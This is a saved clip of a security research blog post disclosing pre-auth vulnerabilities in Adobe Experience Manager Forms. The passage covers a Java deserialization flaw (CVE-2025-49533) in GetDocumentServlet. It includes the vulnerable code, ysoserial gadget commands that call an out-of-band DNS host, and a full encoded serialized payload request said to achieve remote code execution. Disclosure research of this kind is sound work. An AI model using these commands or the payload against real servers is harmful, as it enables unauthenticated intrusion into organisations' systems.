---
raindrop_id: 1321645886
raindrop_highlights:
  697b56fceafd7964eb0e67ee: f1e990d22a47ed7f5e8f016911651a08
  697b570acffd43c0e8bf0817: a64d8647c50713dab5a3a838bec99f65
  697b57182f1735b6183bd8cf: f5179f7f4a2f72143e01a999e25b5ad8
  697b5722580de27af2798b10: 1b69a2f1c894df41206a8a1446bc7cf9
  697b579cb57209193e437277: 3896ee06b8182ab3aa02d8e5c54ea333
  697b57a4c0eb7aa6d2c9073d: 2cfd39a5a678454808be667c9121b083
  697b57aa8fef34ef0a7c72b8: d6a5106ad416dd76e2fee53cd3745596
  697b57b2d96b00841e6ae749: fd5437be2de957290ef2c986d5ae1a5a
  697b57b97f7ad1c3c8d39fca: db630b593c40b4aa95eaf2f9c3d6e0db
  697b57c2c67ba0fe5b45230f: 325fec6a6e936916bee96bfd7e15aa7a
  697b57e7fdafb458a7753359: cfa87793e1c4327d86985f8de1b1b5af
  697b57f2797e9f9d7c80af10: 71f40a869d4e222b44ae822a524b5863
  697b5801c67ba0fe5b4530fb: 9a2227a8d58cb0d7abaff6a32bdbf49e
  697b5824580de27af279cef4: 03b4c7f8b7bf2c769bb87e9c422e119f
  697b5833580de27af279d2e5: 7ed5fa493ffbaabd67ae689c7cb87ffc
title: "Struts Devmode in 2025? Critical Pre-Auth Vulnerabilities in Adobe Experience Manager Forms › Searchlight Cyber"

description: |-
  Vulnerabilities in AEM Forms The Searchlight Cyber Research Team discovered and disclosed three critical vulnerabilities in Adobe Experience Manager Forms to Adobe in late April 2025. As of writing this research post, 90 days have passed since our disclosure to Adobe. During this time, Adobe has only released a patch for one of the three

source: https://slcyber.io/assetnote-security-research-center/struts-devmode-in-2025-critical-pre-auth-vulnerabilities-in-adobe-experience-manager-forms

created: 2025-07-29
sync-date: 1769936775849
tags:
  - "_index"

 
  - "tech-blog"

---
# Struts Devmode in 2025? Critical Pre-Auth Vulnerabilities in Adobe Experience Manager Forms › Searchlight Cyber

![](https://slcyber.io/wp-content/uploads/2025/07/Social_CiJ_6_Dark.webp)

> [!summary]
> Vulnerabilities in AEM Forms The Searchlight Cyber Research Team discovered and disclosed three critical vulnerabilities in Adobe Experience Manager Forms to Adobe in late April 2025. As of writing this research post, 90 days have passed since our disclosure to Adobe. During this time, Adobe has only released a patch for one of the three





A Fairly Standard Insecure Deserialization Vulnerability (CVE-2025-49533)
In a JBoss environment, application bundles are typically deployed in the format of .EAR files.
These files contain a mapping for each WAR file and their location accessible on the web server.
This mapping file is typically found at META-INF/application.xml
servlet had the following code:
public class GetDocumentServlet extends BaseAppServlet { private static final long serialVersionUID = 7783925106122386434L; public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException { try { String serDoc = request.getParameter("serDoc"); String trace = request.getParameter("TRACE"); if (serDoc == null || serDoc.length() == 0) throw new Exception("Missing serDoc parameter"); byte[] rawDoc = URLUtils.decodeAndUnzip(serDoc, false); Document p = URLUtils.deserializeDoc(rawDoc); response.setHeader("Content-Disposition", "attachment;filename=" + p.getAttribute("name")); String contentType = p.getContentType(); if (contentType != null && !"".equals(contentType)) response.setContentType(contentType); ServletOutputStream oSOS = response.getOutputStream(); if (p != null) { InputStream docis = p.getInputStream(); int n = 0; int tot_n = 0; byte[] buf = new byte[8192]; while ((n = docis.read(buf)) > 0) { oSOS.write(buf, 0, n); tot_n += n; } p.dispose(); response.setContentLength(tot_n); if (trace != null && trace.toLowerCase().indexOf("formserver") >= 0) FormsLogger.logInfo(getClass(), "GetDocumenServlet: returning " + contentType + " (" + tot_n + ") bytes"); } oSOS.flush(); oSOS.close(); } catch (Exception e) { handleException(response, e); } } }
The serDoc parameter was first decoded through URLUtils.decodeAndUnzip
public static byte[] decodeAndUnzip(String in, boolean urlDecode) throws Exception { long startTime = FormsLogger.logPerformance(false, 0L, "<URLUtils-decodeAndUnzip>"); byte[] res = null; if (in != null) { byte[] dec = null; if (urlDecode) { dec = ServletUtil.URLDecode(in); } else { dec = in.getBytes("UTF8"); } if (dec != null) { dec = Base64.decode(dec); if (dec != null) res = GZip.ungzip(dec); } } FormsLogger.logPerformance(true, startTime, "</URLUtils-decodeAndUnzip>"); return res; }
then deserialized through the call to URLUtils.deserializeDoc(rawDoc)
public static Document deserializeDoc(byte[] docBytes) throws Exception { long startTime = FormsLogger.logPerformance(false, 0L, "<URLUtils-deserializeDoc>"); if (docBytes == null) return null; ByteArrayInputStream bis = new ByteArrayInputStream(docBytes); ObjectInputStream ois = new ObjectInputStream(bis); Document docObject = (Document)ois.readObject(); FormsLogger.logPerformance(true, startTime, "</URLUtils-deserializeDoc>"); return docObject; }
To exploit this, we first tried the following command:

java -jar ysoserial-all.jar CommonsBeanutils1 "nslookup test.gk4iaajx122vx96khp8h2h2pcgi863us.oastify.com" | gzip | base64 -w0
our target resulted in the following error:

com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl from [Module "deployment.adobe-livecycle-jboss.ear.adobe-forms-res.war" from Service Module Loader]
java.lang.ClassNotFoundException: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl from [Module "deployment.adobe-livecycle-jboss.ear.adobe-forms-res.war" from Service Module Loader]
Based on this error, we took a few moments to understand the gadget chain being constructed through ysoserial in a bit more detail
Since org.apache.xalan.xsltc.trax.TemplatesImpl existed in our environment, all we had to do to exploit this deserialization issue was modify our ysoserial command to be the following:

java -DproperXalan=true -jar ysoserial-all.jar CommonsBeanutils1 "nslookup test.gk4iaajx122vx96khp8h2h2pcgi863us.oastify.com" | gzip | base64 -w0
We took the output of this and sent the following request to achieve RCE:

GET /FormServer/servlet/GetDocumentServlet?serDoc=<@urlencode>H4sIAAAAAAAAA61WS28bVRg949dMJk6auknTppT03SRtZ5q45NGkTRu3adwaGnCaSrhSdD252NPYM9OZO41dCRas+AFsWCIhddFuWlCpkEBiCQtWrGCDhGCBBBs2SDy/GTvPWoJK2PJ9fHe+97ln/PBnxD0XvbfZXab5wqxo865pu6aov+pzn7/7zemPfp9++1EUkSxinnmP56AadtVhLhO2K7A7F2jqgaaeWZdP1hwAETJ8wnZLGnOYUeYa6VVty9OKnFmBgqfN0GpD6/v33/nJO/TBXASRLV7u4C1IOSiOazvcFXWBVMNrhVklPS9c0yqRR/I2FKYRiLWG+EiGeTxredzyTGHe5RvOVqO33rw1/8NXEaDmCHTZvnB8Md9wYXJvNUYZRMnmWQpE83xL25RJjZEPzbQEdy1W0WpeRRiacFlNW+BVp8IE97I0t928/rn18EE6ikQWHUumtcwt8YpfLXI3i84lUrC8ChdZktcKUJeKdcENe5l7AtFCYaaAxJJRYR5tU4VNGWcC2WQO8SWLVXlQnVgOO5e2Z7C1ORvyRnPwN318N3R07c+9PaXSt2NhLYLGkTxSmHn4a+9vCWXhu6Y4fvTLvz75jI7TuKpiJw7LOKLgqIpjOK4iggEFg8E8pCCl4ISCkwpOtaELmgodp4NhWMaIjIsyzkiIGtVlqVUnJSSmTMsU5+mZgcFFCbEM1UTCjpxp8Ub1FlixwgNl22CVReaawb4pjImy6UnQcnXP9jgdVXSH1Ss2W/Z0sdadAKtVZi2vtYucKlNGpek2RqGRiV2FVsF15AUzVl5mTuhPxn7KSYKat33X4LNmEEL3NutaYCaJbvRI6NpuUoJse1rQSRkvJTGKsSTGMUHJr5pWEmdBPiO6QVEVmVem9SkjiRR2yZhK4hzOJzGNCxRsaNe09ez1yzWDO8K0LQknn6cIW4K7XrzNDbE13rpHuhLaS3wNZnUJxwaerdJgq8K1Cztnr3I3uJJUo4GWDymGbQlmWlT+fZsNZ8rMzfM7PrcMPjn4uoSdG2ev+ZYwq2RTpcDWNz1bHDTF5CHGa5yqOTDQorubNShDg9M9k3DueYqYTk8MT4wOp0+Pjoylx9PDhPTp54LiMwYm6ca0IQNNwlniC9te8Z0DpCi00soZk7HbteGRkbu1idGVsjNeHimPOEbJHB9N+55mM0+Yb9QD5lVwWcIFWujEZTpxmd7gMj3kMn2Ny/SQy3S3US79YtEjljLEQpOqZFxRMYfDOEj3eo64gDoWgDEgDVoTwmncTTudZonm+NDHyD4Kj3tpTDSE2ENjsrneixmaFexbV34Met/QfCk1+yEuJT5F5Foq+hSxJ4inEk8gv4euoWhKyQ/FUm35++igjRps2vND8cdI5p+S6Ak6b94nYnxENlW6IjPYQVaDGDS0k1eVvh3oQyf66eQ48dlJSmSYUhijGKbDqHqp6n3rsaqYwAvYT7sX6deJ2B84LqO/bV7GgaAQB8MsD/kBIXeR4Ot1utynkuseGb0y9sjYS5eqgYZF7np0TW9kL1GxrhK1ZOj1KJglFlnF5/E7P5q/TFWv7Pl/CDE6a9sSklnLoisYvEE4CY+2gmb4vrjCluk2eUdIa3IbvSWbZ01aU9Euo0/C4f9gqiXFdK9RVz7UNu814u7/F3tU8AjVlRKkXx+1NACXHDZBCdFHgdGY3IZGqYHGjnU0fkG93EDjDkJBcN6AdDfhAmSIaJdQ0YU2+qugXLu4MHfjxtyssyqhFnS7o/YPPlGKQ0cJAAA=</@urlencode> HTTP/1.1
Host: target